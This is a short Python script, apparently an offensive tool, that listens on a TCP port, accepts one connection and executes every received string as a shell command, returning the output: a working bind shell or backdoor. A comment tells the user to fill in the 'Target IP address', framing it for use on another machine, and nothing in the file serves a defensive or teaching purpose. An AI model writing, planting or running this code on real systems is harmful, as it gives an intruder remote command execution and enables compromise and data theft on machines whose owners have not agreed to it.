#!/usr/bin/env python

import os, socket,subprocess, sys


ip = '0.0.0.0' # Replace with Target IP address
port = 1234     # Replace with Port number


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((ip,port))
server.listen(1)

print(' [*] Listening for incoming connection...')

client_socket,addr = server.accept()
print(' [+] Connection established: ' + str(addr[0]) + ':' + str(addr[1]))

while True:
   command = client_socket.recv(1024).decode()
   if command == 'exit':
        break
   else:
      process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
      output = process.stdout.read()
      client_socket.sendall(output)

client_socket.close()

